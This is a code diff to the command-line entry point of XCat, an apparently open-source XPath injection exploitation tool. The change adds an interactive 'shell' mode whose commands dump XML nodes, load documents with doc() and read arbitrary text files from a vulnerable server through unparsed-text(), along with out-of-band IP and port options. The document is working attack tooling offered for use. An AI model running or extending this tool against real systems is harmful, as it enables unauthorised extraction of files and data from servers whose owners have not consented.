@@ -2,8 +2,8 @@
 XCat.
 
 Usage:
-    xcat (--true-string=<string> | --true-code=<code>) [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)]
-         <url> <target_parameter> [<parameters>]...
+    xcat <url> <target_parameter> [<parameters>]... (--true-string=<string> | --true-code=<code>) [--shell] [--fast]
+         [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)]
     xcat detectip
 
 """
@@ -13,12 +13,19 @@ import asyncio
 import aiohttp
 import operator
 import ipgetter
+
+from xcat.algorithms import iterate_all, count
 from xcat.requester import Requester
 from xcat.payloads import detect_payload
 from xcat.features import detect_features
 from xcat import actions
 from typing import Callable
 from xcat.display import display_xml
+import shlex
+
+from xcat.xpath import E
+from xcat.xpath.xpath_2 import doc
+from xcat.xpath.xpath_3 import unparsed_text
 
 
 def run():
@@ -39,15 +46,21 @@ def run():
     url = arguments['<url>']
     target_parameter = arguments['<target_parameter>']
     parameters = arguments['<parameters>']
-    print(arguments)
+
     oob_ip = arguments["--oob-ip"]
     oop_port = arguments["--oob-port"]
 
+    shell = arguments['--shell']
+    fast = arguments['--fast']
+
     loop = asyncio.get_event_loop()
-    loop.run_until_complete(start_action(url, target_parameter, parameters, match_function, oob_ip, oop_port))
+    loop.run_until_complete(start_action(url, target_parameter,
+                                         parameters, match_function,
+                                         oob_ip, oop_port,
+                                         shell, fast))
 
 
-async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port):
+async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port, shell, fast):
     async with aiohttp.ClientSession() as session:
         payload_requester = Requester(url, target_parameter, parameters, match_function, session)
 
@@ -70,16 +83,21 @@ async def start_action(url, target_parameter, parameters, match_function, oob_ip
 
         requester = Requester(url, target_parameter, parameters, match_function, session,
                               injector=chosen_payload.payload_generator,
-                              external_ip=oob_ip, external_port=oob_port)
+                              external_ip=oob_ip, external_port=oob_port,
+                              fast=fast)
 
         print("Detecting Features...")
         features = await detect_features(requester)
 
-        for feature in features:
-            print(f' - {feature.name}')
-            requester.features[feature.name] = True
-        return
-        await display_xml([await actions.get_nodes(requester)])
+        for feature, available in features:
+            print(f' - {feature.name} - {available}')
+            requester.features[feature.name] = available
+
+        if shell:
+            await run_shell(requester)
+        else:
+            await display_xml([await actions.get_nodes(requester)])
+        print(f'Total Requests: {requester.request_count}')
 
 
 def make_match_function(arguments) -> Callable[[aiohttp.Response, str], bool]:
@@ -107,6 +125,39 @@ def make_match_function(arguments) -> Callable[[aiohttp.Response, str], bool]:
 
     return response_checker
 
+
+async def run_shell(requester: Requester):
+    # This function is horrible and I feel bad :(
+    print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
+    while True:
+        command = shlex.split(input(">> "))
+
+        if command[0] == "help":
+            pass
+
+        if command[0] == "fetch":
+            if len(command) != 2:
+                print("fetch 'xpath expression'")
+            else:
+                await display_xml([await actions.get_nodes(requester, E(command[1]))])
+
+        if command[0] == "read_xml":
+            if len(command) != 2:
+                print("read_xml 'xml path'")
+            else:
+                await display_xml([await actions.get_nodes(requester, doc(command[1]))])
+
+        if command[0] == "read_text":
+            if len(command) != 2:
+                print("read_text 'text path'")
+            else:
+                if requester.features['unparsed-text']:
+                    length = await count(requester, unparsed_text(command[1]))
+                    print(f"Lines: {length}")
+                    async for line in iterate_all(requester, unparsed_text(command[1])):
+                        print(repr(line))
+                elif requester.features['oob-entity-injection']:
+                    pass
 
 if __name__ == "__main__":
     run()
